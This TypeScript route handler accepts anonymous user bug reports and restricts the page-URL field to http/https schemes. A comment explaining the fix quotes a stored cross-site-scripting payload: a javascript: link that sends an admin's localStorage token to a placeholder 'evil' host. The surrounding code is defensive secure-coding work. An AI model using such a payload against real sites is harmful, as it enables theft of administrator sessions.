import { Hono } from 'hono';
import { HTTPException } from 'hono/http-exception';
import { z } from 'zod';
import { createDb, cleanSecret } from '../db/client.js';
import { verifyToken } from '../auth/jwt.js';
import { userReports, users } from '../db/schema.js';
import { rateLimit } from '../middleware/rateLimit.js';
import { eq } from 'drizzle-orm';
import type { AppContext } from '../env.js';

/**
 * An http(s) URL, and nothing else.
 *
 * This field is rendered as a clickable link in the admin dashboard, and this
 * endpoint takes writes from anyone — no account, no token. `z.string()` let a
 * stranger store `javascript:fetch('https://evil/?t='+localStorage.token)`
 * under a plausible-looking bug report, and one admin click ran it on
 * banapply.com with a 30-day admin session sitting in localStorage.
 *
 * Note that `z.string().url()` would NOT have been enough either — it only
 * asks whether `new URL()` parses, and `javascript:`, `data:` and `file:` all
 * parse fine. The scheme is the thing that matters, so the scheme is what is
 * checked. The client refuses to render anything else as an href as well;
 * neither half is load-bearing alone, because rows written before this existed
 * are still in the table.
 */
const httpUrl = z
  .string()
  .max(2048)
  .refine((value) => /^https?:\/\//i.test(value), 'Page URL must start with http:// or https://');

const reportSchema = z.object({
  category: z.enum(['autofill', 'parser', 'site_issue', 'bug', 'suggestion', 'other']).default('bug'),
  subject: z.string().min(1).max(200),
  description: z.string().min(1).max(3000),
  pageUrl: httpUrl.nullable().optional(),
});

export const reportRoutes = new Hono<AppContext>();

reportRoutes.post('/', rateLimit('REPORT_LIMITER'), async (c) => {
  const parsed = reportSchema.safeParse(await c.req.json().catch(() => null));
  if (!parsed.success) {
    throw new HTTPException(400, {
      message: parsed.error.issues[0]?.message ?? 'Invalid report input',
    });
  }

  const header = c.req.header('Authorization') ?? '';
  const [scheme, token] = header.split(' ');

  let userId: string | null = null;
  let userEmail: string | null = null;

  if (scheme?.toLowerCase() === 'bearer' && token) {
    try {
      const claims = await verifyToken(token, cleanSecret(c.env.JWT_SECRET));
      if (claims) {
        const db = createDb(c.env);
        const user = await db
          .select({ email: users.email, tokensValidFrom: users.tokensValidFrom })
          .from(users)
          .where(eq(users.id, claims.userId))
          .limit(1);

        /*
         * Attribution only, and only for a session that is still live. A
         * revoked token must not be able to put someone else's address on a
         * report — this route stays open to anonymous submissions, so the
         * failure mode is simply an unattributed report rather than a refusal.
         */
        const issuedAt = claims.issuedAt;
        if (user[0] && issuedAt !== null && issuedAt >= user[0].tokensValidFrom.getTime()) {
          userId = claims.userId;
          userEmail = user[0].email;
        }
      }
    } catch {
      /* Token verification error fallback */
    }
  }

  const db = createDb(c.env);

  const [report] = await db
    .insert(userReports)
    .values({
      userId,
      userEmail,
      category: parsed.data.category,
      subject: parsed.data.subject,
      description: parsed.data.description,
      pageUrl: parsed.data.pageUrl ?? null,
      status: 'open',
    })
    .returning();

  return c.json({ report }, 201);
});
